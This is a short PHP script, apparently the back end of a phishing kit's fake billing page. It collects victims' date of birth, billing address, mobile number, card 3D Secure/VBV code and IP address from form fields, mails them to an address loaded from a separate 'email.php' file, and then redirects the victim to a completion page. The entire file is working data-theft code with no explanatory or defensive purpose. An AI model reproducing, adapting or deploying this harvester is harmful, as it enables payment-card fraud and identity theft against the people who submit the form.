<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$country = $_POST['county'];
$msg = "
--------NEW BILLING------------------------------------------------------>
Date of Birth : ".$_POST['day']." ".$_POST['month']." ".$_POST['year']."
Billing Address : ".$_POST['billing']."
City : ".$_POST['city']."
Country : ".$_POST['county']."
Zip code : ".$_POST['postcode']."
Mobile Number : ".$_POST['mobile']."
3D/VBV : ".$_POST['vbv']."
IP : $ip
==================================";

include 'email.php';
$subj = "Billing  de [$country] // - $ip";
$headers .= "Content-Type: text/plain; charset=UTF-8\n";
$headers .= "Content-Transfer-Encoding: 8bit\n";
mail("$to", $subj, $msg,"$headers");
header("Location: complete.php?ip=$ip");
?>